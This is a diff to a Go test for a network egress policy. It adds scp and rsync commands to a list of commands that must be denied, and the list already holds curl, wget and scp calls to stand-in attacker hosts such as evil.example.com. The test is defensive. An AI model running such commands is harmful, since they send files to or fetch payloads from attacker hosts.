@@ -21,6 +21,8 @@ func TestEgressDenied(t *testing.T) {
 		"curl https://evil.example.com/x",
 		"wget http://attacker.net/payload",
 		"scp file.txt user@exfil.example.com:/tmp",
+		"scp f.txt evil.example.com:/tmp",
+		"rsync -av ./ evil.example.com::mod",
 	}
 	for _, c := range deny {
 		v := evalNet(t, c, pol)
